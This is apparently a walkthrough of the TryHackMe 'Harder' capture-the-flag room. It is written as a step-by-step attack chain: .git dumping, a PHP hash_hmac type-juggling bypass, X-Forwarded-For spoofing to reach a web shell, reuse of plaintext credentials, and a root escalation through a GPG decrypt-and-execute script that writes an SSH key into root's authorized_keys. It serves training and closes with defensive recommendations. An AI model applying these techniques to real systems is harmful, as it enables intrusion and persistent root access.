# Harder — TryHackMe Writeup

**Room:** https://tryhackme.com/room/harder
**Difficulty:** Hard
**Category:** Web Exploitation · Git Dumping · HMAC Bypass · GPG · Privilege Escalation

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{█████████████████████████████████████████}` |
| root.txt | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

Starting with an Nmap scan to identify open services:

```bash
nmap -sV -T4 -Pn 10.10.199.197
```

Two TCP ports are open:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3
80/tcp open  http    nginx 1.18.0
```

- **22/tcp** — SSH
- **80/tcp** — Nginx web server

---

## 2. Web Enumeration

Scanning the web root reveals nothing particularly interesting at first glance. Running `curl` with verbose header output surfaces something useful:

```bash
curl -I http://10.10.199.197
```

The response headers reveal a virtual host subdomain: `pwd.harder.local`. Add it to `/etc/hosts`:

```bash
echo "10.10.199.197 pwd.harder.local" >> /etc/hosts
```

Navigate to `http://pwd.harder.local` and a login form appears. Testing the classic default credential pair `admin / admin` works — access is granted, but the page shows only:

```
extra security in place. our source code will be reviewed soon ...
```

---

## 3. Git Repository Dumping

Scanning the subdomain for hidden files and directories reveals an exposed `.git` folder. Using **GitTools** (specifically the Dumper) to download the entire git project:

```bash
# Using gitTools Dumper
./gitdumper.sh http://pwd.harder.local/.git/ ./dumped-repo
```

With the repository on disk, examine the commit history:

```bash
git log --oneline
```

Three commits are present. The second commit contains the most interesting diff. Examining it:

```bash
git show <commit-hash>
```

The diff reveals the core security check for a PHP endpoint:

```php
+<?php
+if (empty($_GET['h']) || empty($_GET['host'])) {
+   header('HTTP/1.0 400 Bad Request');
+   print("missing get parameter");
+   die();
+}
+require("secret.php"); //set $secret var
+if (isset($_GET['n'])) {
+   $secret = hash_hmac('sha256', $_GET['n'], $secret);
+}
+
+$hm = hash_hmac('sha256', $_GET['host'], $secret);
+if ($hm !== $_GET['h']){
+  header('HTTP/1.0 403 Forbidden');
+  print("extra security check failed");
+  die();
+}
+?>
```

The endpoint requires three GET parameters: `h`, `host`, and optionally `n`. The server uses `hash_hmac` with a secret stored in `secret.php` to validate the `h` parameter against the `host` value.

---

## 4. HMAC Bypass via Type Juggling

The vulnerability lies in the optional `n` parameter. When `n` is provided:

```php
$secret = hash_hmac('sha256', $_GET['n'], $secret);
```

If `$_GET['n']` is passed as an **array** (e.g., `n[]=1`), PHP's `hash_hmac` throws a warning and returns `false`. This means `$secret` becomes the boolean `false`.

When `false` is used as the HMAC key in the next call:

```php
$hm = hash_hmac('sha256', $_GET['host'], $secret);
```

PHP coerces `false` to an empty string as the key. This means we can **compute the valid HMAC ourselves** with an empty string as the secret:

```bash
php -a
Interactive shell

php > $secret = hash_hmac('sha256', "d3vyce.fr", false);
php > echo $secret;
d0455abc97030b6f667f0f090493beca091e92c1e8c0e04ae09541afb26380c8
```

Construct the bypass URL:

```
http://pwd.harder.local/?n[]=1&h=d0455abc97030b6f667f0f090493beca091e92c1e8c0e04ae09541afb26380c8&host=d3vyce.fr
```

The security check passes. The page response reveals a new subdomain: `shell.harder.local`.

---

## 5. IP Restriction Bypass — X-Forwarded-For

Add the new subdomain to `/etc/hosts` and navigate to it. The server responds with:

```
Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
```

The IP restriction can be bypassed by adding an `X-Forwarded-For` header spoofing a whitelisted address. Using Burp Suite (or curl with a custom header):

```http
GET /index.php HTTP/1.1
Host: shell.harder.local
X-Forwarded-For: 10.10.10.240
User-Agent: Mozilla/5.0 ...
Cookie: PHPSESSID=eb15g7jblveoceue5ekdjooiqj
Connection: close
```

The page now loads and presents a **command execution interface** — a web shell running as user `evs`.

---

## 6. Finding Credentials in a Backup Script

Using the web shell to explore the filesystem, a backup script is found:

```bash
cat /var/www/shell/evs-backup.sh
```

```bash
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"
```

Credentials in plaintext inside a comment:
- **User:** `evs`
- **Password:** `U6j1brxGqbsUA$pMuIodnb$SZB4$bw14`

---

## 7. SSH Login & User Flag

```bash
ssh evs@10.10.199.197
# Enter password: U6j1brxGqbsUA$pMuIodnb$SZB4$bw14
```

Grab the user flag from the home directory.

**user.txt:** `THM{█████████████████████████████████████████}`

---

## 8. Privilege Escalation — GPG-Encrypted Script Execution

Running `linpeas.sh` on the target highlights an interesting SUID or privileged script. Examining it:

```bash
cat /usr/local/bin/run-crypted.sh
```

```bash
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encrypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi
```

This script decrypts a GPG-encrypted file using root's GPG keyring, then pipes the result to `ash` — meaning it executes the decrypted content **as root**. The root GPG public key is accessible to us, which means we can encrypt any command and have it executed as root.

Import the root public key:

```bash
gpg --import /path/to/root_public_key.gpg
```

Verify the import:

```bash
harder:~$ gpg --list-key
/home/evs/.gnupg/pubring.kbx
----------------------------
pub   ed25519 2020-07-07 [SC]
      6F99621E4D64B6AFCE56E864C91D6615944F6874
uid           [ unknown] Administrator <root@harder.local>
sub   cv25519 2020-07-07 [E]
```

Create a shell script that backdoors root's SSH authorized_keys:

```bash
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...YOUR_PUBLIC_KEY... attacker@kali" > /root/.ssh/authorized_keys
```

Save it as `script.sh`, then encrypt it with the root public key:

```bash
gpg --encrypt --recipient root@harder.local --output script.sh.gpg script.sh
```

Execute it through the privileged script:

```bash
run-crypted.sh script.sh.gpg
```

The script runs as root, writing our public key to `/root/.ssh/authorized_keys`.

---

## 9. SSH as Root & Root Flag

```bash
ssh -i id_rsa root@10.10.199.197
```

We are now root. Grab the final flag:

```bash
cat /root/root.txt
```

**root.txt:** `THM{█████████████████████████████████████████}`

---

## Recommendations (from the room)

- Do not leave `.git` directories accessible from a web server — they expose the entire project history including deleted secrets.
- Never store credentials in source code or script comments, even in "internal" scripts.
- Run web applications as a user with the minimum required permissions.
- Do not leave root's GPG public key accessible to other users — if an attacker can encrypt with it, they can run arbitrary commands through a decrypt-and-execute chain.

---

## Key Learnings

- **Exposed `.git` folders leak everything** — even deleted or modified content lives in the git history. Tools like `gitdumper` or `git-dumper` can reconstruct the full repository from a publicly accessible `.git` directory.
- **`hash_hmac` with an array argument returns `false`** — PHP's type juggling means `hash_hmac('sha256', [], $key)` silently returns `false` instead of a string. If `false` is then used as a key in a subsequent `hash_hmac` call, the key becomes an empty string — a value an attacker can reproduce independently.
- **`X-Forwarded-For` bypasses naïve IP whitelisting** — if a server checks client IP using only `$_SERVER['HTTP_X_FORWARDED_FOR']` or trusts reverse proxy headers without validation, spoofing the header is trivial.
- **A decrypt-and-execute pattern with accessible public keys is dangerous** — if the encrypted payload format is predictable, anyone who can encrypt to the target key can control what gets executed. Root's public key should never be readable by other users in this kind of architecture.
- **Check linpeas output for custom scripts and unusual binaries** — the `run-crypted.sh` script would be easy to miss during manual enumeration but stands out in linpeas output as a non-standard SUID or privileged executable.

## Conclusion

Harder lives up to its name with a multi-stage chain that requires understanding both web exploitation and cryptographic primitives. The HMAC bypass via PHP type juggling is the standout technique — it demands reading the source code carefully and knowing how `hash_hmac` behaves when passed non-string types. The GPG-encrypted execution privilege escalation is equally creative, turning a "secure" execution mechanism into a backdoor by leveraging the publicly accessible root key. Together they make Harder one of the more technically layered rooms on TryHackMe.
